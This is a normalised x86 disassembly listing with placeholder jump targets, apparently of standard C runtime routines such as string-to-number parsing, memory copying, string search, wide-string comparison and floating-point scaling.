push esi
call sub_100175c0
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_10017e85
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_1001b100
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_10016c21
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_1001a220
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_1001b0c5
pop ecx
push eax
mov edi r--data
push edi
call sub_100175c0
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_1001b0c5
pop ecx
push eax
push edi
call sub_100175c0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_10017e85
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10016dbd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10017e85
mov esi [ eax ]
call sub_10017e85
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1001b2c7
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_10017e85
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_10017e85
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10016e26
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_1001b2de
sub_10016efc
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_10018330
lea esi [ eax + 0x1 ]
push esi
call sub_10019b49
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1001b438
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10016f5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_10016efc
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10016f81
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_10016f3c
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_10016efc
jmp r-xdata
sub_10016fc1
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10016f5a
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10016fdf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10016f3c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_10017006
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_10016f81
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10017050
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_100170d4 ]
jmp [ ecx * 4 + jump_table_10017154 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171c0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1001735c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10017260 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001735c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100171c0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1001735c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100171c0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001735c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001735c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001735c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_100173cc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100173bc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_100173ed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1001b620
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_1001740d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10019b49
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1001b6b7
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10017006
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10017df7
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_10016ed2
push sub_100299d7
mov [ rw-data ] esi
call sub_10018d37
pop ecx
sub_10017498
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1001b6e0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100183c0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_1001750d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_10017e85
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10017e43
pop ecx
mov [ esi ] eax
pop esi
sub_10017547
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10017050
add esp 0xc
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_1001759a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001bb54
add esp 0x14
pop ebp
retn
sub_100175c0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_100176a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_100176e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1001c0b4
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1001be8b
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1001c609
mov [ esi + 0x4 ] eax
sub_1001776d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001caca
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_1001caca
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_10017870
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001776d
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_100178fb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_100179c8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_1001d405
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_1001cb97
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_1001d405
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001cbfd
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_1001ccc0
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_1001d2a9
add esp 0x18
jmp r-xdata
call sub_1001d30a
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001cb6a
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001cb6a
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_1001d405
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001cb6a
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_10017b7a
push 0x8
push r--data
call sub_1001de70
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1001b8f4
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1001c26b
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
